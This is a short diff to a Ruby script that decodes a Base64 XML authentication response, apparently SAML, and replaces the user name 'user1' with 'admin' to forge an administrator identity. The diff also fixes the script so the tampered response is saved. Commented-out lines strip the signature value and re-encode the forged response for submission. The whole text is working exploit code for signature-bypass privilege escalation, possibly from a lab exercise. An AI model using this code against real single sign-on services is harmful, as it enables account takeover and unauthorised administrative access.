@@ -6,9 +6,9 @@ response = Base64.decode64(str)
 File.write("original_response.xml", response)
 
 
-malicious_response = response.gsub("user1", "user2")
+malicious_response = response.gsub("user1", "admin")
 
-File.write("malicious_response.xml", response)
+File.write("malicious_response.xml", malicious_response)
 
 #without_signature = malicious_response.gsub(/<ds:SignatureValue>.*$\/ds:SignatureValue>/, "<ds:SignatureValue></ds:SignatureValue>") 
 #output = URI.escape(Base64.strict_encode64(without_signature),"+/=")
